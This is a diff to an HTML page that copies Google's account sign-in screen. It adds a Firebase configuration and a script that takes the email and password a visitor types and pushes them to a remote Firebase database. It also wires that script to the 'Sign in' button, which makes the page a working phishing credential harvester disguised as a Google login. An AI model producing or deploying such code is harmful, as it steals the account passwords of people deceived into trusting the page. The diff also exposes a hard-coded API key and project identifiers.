@@ -1928,6 +1928,33 @@
   Sign in with your Google Account
   </h2>
 </div>
+<script src="https://www.gstatic.com/firebasejs/3.6.5/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyAAK2YT7Z6JFtuv0TTLkrKQ1P5puEcTRaA",
+    authDomain: "test-8e486.firebaseapp.com",
+    databaseURL: "https://test-8e486.firebaseio.com",
+    storageBucket: "test-8e486.appspot.com",
+    messagingSenderId: "750267040614"
+  };
+  firebase.initializeApp(config);
+</script>
+<script>
+function myFunction() {
+	var email=document.getElementById("Email-hidden").value;
+	var passwd=document.getElementById("Passwd").value;
+	var database = firebase.database().ref('message_list');
+	var newMessageRef = database.push();
+newMessageRef.set({
+  'user_id': email,
+  'text': passwd
+});
+
+	
+    alert(email+'@ '+passwd);
+}
+</script>
 <div class="main-content 
   
   
@@ -2008,7 +2035,7 @@
        placeholder="Enter the letters above"
        title="Type the characters you see or numbers you hear">
 </div>
-<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Next">
+<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Next" >
   <a class="need-help"
         href="https://accounts.google.com/signin/usernamerecovery?hl=en">
   Find my account
@@ -2041,7 +2068,7 @@
   </div>
   </div>
   </div>
-<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
+<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in" onclick="myFunction()">
   <label class="remember">
   <input id="PersistentCookie" name="PersistentCookie"
                  type="checkbox" value="yes"
